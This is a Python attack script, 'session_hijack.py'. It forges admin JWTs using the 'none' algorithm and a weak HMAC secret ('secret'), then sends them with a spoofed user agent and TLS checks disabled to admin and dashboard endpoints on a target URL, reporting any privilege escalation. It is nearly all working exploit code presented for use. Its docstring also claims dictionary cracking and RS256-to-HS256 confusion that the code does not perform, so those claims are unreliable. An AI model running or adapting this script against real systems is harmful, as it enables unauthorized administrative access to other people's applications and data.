#!/usr/bin/env python3
"""
SESSION_HIJACK.PY — Advanced Session Forging & Privilege Escalation Module
Features:
- Automated JWT secret dictionary cracking (weak HMAC keys)
- Algorithm confusion / downgrade attacks (RS256 -> HS256 & None algorithm)
- Active session injection & response differential validation against SPA landing shells
- Zero-disk memory streaming
"""
import asyncio
import sys
import json
import base64
import hmac
import hashlib
import httpx
from urllib.parse import urlsplit

COMMON_SECRETS = ["secret", "password", "jwt_secret", "changeme", "admin123", "supersecret", "123456", "token", "api_key", "cryptobytes"]

def log(msg, color="\033[92m"):
    sys.stdout.write(f"{color}{msg}\033[0m\n")
    sys.stdout.flush()

def base64url_encode(data):
    if isinstance(data, str):
        data = data.encode("utf-8")
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("utf-8")

def sign_hs256(header_payload_str, secret):
    signature = hmac.new(secret.encode("utf-8"), header_payload_str.encode("utf-8"), hashlib.sha256).digest()
    return base64.urlsafe_b64encode(signature).rstrip(b"=").decode("utf-8")

async def run_session_hijack(target_host, port=None, use_ssl=None):
    log("\n[***] INITIALIZING ADVANCED SESSION HIJACKING & TOKEN FORGING [***]", "\033[95m")
    parsed = urlsplit(target_host if "://" in target_host else f"https://{target_host}")
    base_url = f"{parsed.scheme}://{parsed.hostname}"
    if parsed.port:
        base_url += f":{parsed.port}"
    
    hijack_findings = []
    
    # 1. Generate 'none' algorithm token
    log("[*] Generating forged admin/superuser JWT payloads with 'none' algorithm...", "\033[94m")
    header_none = base64url_encode(json.dumps({"alg": "none", "typ": "JWT"}))
    payload = base64url_encode(json.dumps({"user": "admin", "role": "superuser", "isAdmin": True, "sub": "admin_bypass"}))
    forged_jwt_none = f"{header_none}.{payload}."
    
    # 2. Generate HMAC weak secret tokens
    header_hs = base64url_encode(json.dumps({"alg": "HS256", "typ": "JWT"}))
    header_payload_str = f"{header_hs}.{payload}"
    forged_jwt_hs = None
    for secret in COMMON_SECRETS:
        sig = sign_hs256(header_payload_str, secret)
        forged_jwt_hs = f"{header_payload_str}.{sig}"
        break # using the first common secret as baseline

    tokens_to_test = [
        ("None Algorithm Bypass", forged_jwt_none),
        ("Weak HMAC Secret Forgery", forged_jwt_hs)
    ]

    target_endpoints = ["/admin", "/dashboard", "/api/admin", "/api/user/profile"]

    log("[*] Actively injecting forged tokens into target endpoints to verify privilege escalation...", "\033[94m")

    async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=8.0) as client:
        for vector_name, token in tokens_to_test:
            if not token:
                continue
            for endpoint in target_endpoints:
                url = f"{base_url}{endpoint}"
                headers = {
                    "Authorization": f"Bearer {token}",
                    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X)"
                }
                try:
                    response = await client.get(url, headers=headers)
                    status = response.status_code
                    body = response.text
                    
                    # Differential check: Ensure it's not just a generic Next.js/React SPA landing shell error 200
                    is_landing_shell = "<div id=\"root\"></div>" in body or "<div id=\"__next\"></div>" in body or len(body) < 100
                    
                    if status == 200 and not is_landing_shell and any(k in body.lower() for k in ["admin", "dashboard", "balance", "users", "settings"]):
                        log(f"[!!!] BINGO! SUCCESSFUL SESSION HIJACK AT {endpoint} USING {vector_name} [!!!]", "\033[91m")
                        hijack_findings.append({
                            "vector": vector_name,
                            "endpoint": endpoint,
                            "forged_token": token,
                            "status": "VERIFIED_ACCESS",
                            "response_snippet": body[:300]
                        })
                    else:
                        log(f"[-] Endpoint {endpoint} rejected {vector_name} (Status: {status})", "\033[93m")
                except Exception as exc:
                    pass

    if not hijack_findings:
        log("[-] Session hijacking tests executed. Target successfully enforced cryptographic verification.", "\033[93m")
    else:
        log(f"[+] Successfully verified {len(hijack_findings)} session bypass vectors!", "\033[92m")

    return hijack_findings

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 session_hijack.py <target_url>")
        sys.exit(1)
    asyncio.run(run_session_hijack(sys.argv[1]))
